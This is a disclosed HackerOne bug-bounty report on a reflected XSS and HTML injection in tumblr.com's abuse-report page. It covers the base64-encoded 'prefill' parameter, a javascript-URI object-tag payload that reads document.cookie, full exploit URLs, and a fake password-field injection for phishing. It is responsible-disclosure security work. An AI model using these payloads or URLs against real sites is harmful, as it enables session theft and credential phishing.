# [tumblr.com] 69< Firefox Only  XSS Reflected

## Report Details
- **Report ID**: 915756
- **URL**: https://hackerone.com/reports/915756
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-05T08:45:37.031Z
- **Disclosed**: 2020-07-09T17:11:04.710Z

## Reporter
- **Username**: fuzzme
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
Description :

Hello, i have found a XSS Reflected in https://www.tumblr.com/abuse/start?prefill=<base64>
But the XSS only works in versions of firefox that are below 70.
Because its been blocked by CSP, but the version below 69 of firefox is vulnerable.
Here's a great article about this subject https://portswigger.net/daily-swig/firefox-vulnerable-to-trivial-csp-bypass
But CSP dont block HTML tag in the lastest version of all navigators

Vulnerable Url  :

https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=

Payload :

<object data=\"javascript:alert(document.cookie)\">

Vulnerable Parameter :

/\ Note you must decode the $_GET['prefill'], this is encoding is  in base64 /\
After decoded it, you can see this 

{"post":null,"urlreporting":"https://fuzzme.tumblr.com/","tumblelog":"<object data=\"javascript:alert(document.cookie)\">","context":"blog"}

The array value of tumblelog  is reflected into the HTML this him who as vulnerable
The array value of tumblelog  is the  vulnerable array value

 Steps To Reproduce for XSS Only Firefox :

1. Download firefox 69 at https://ftp.mozilla.org/pub/firefox/releases/69.0/
2. Go to login in your Tumblr account
3. Click to this link, and you will see XSS pop-up

LINK : https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=

Steps To Reproduce for HTML injection :

1. Go to login in your Tumblr account
2. Click to this link  https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxpbnB1dCB0eXBlPSd0ZXh0JyBwbGFjZWhvbGRlcj0nRW50ZXIgeW91IHBhc3N3b3JkJz4iLCJjb250ZXh0IjoiYmxvZyJ9
3. And you will see a HTML input  with `enter your password`


POC:

The attachment video

## Impact

The vulnerability allow a malicious user to inject html tags and execute Javascript which could lead to steal user's session, and performing phishing.

## Attachments
- XSS.mp4
- HTMLinjection.mp4
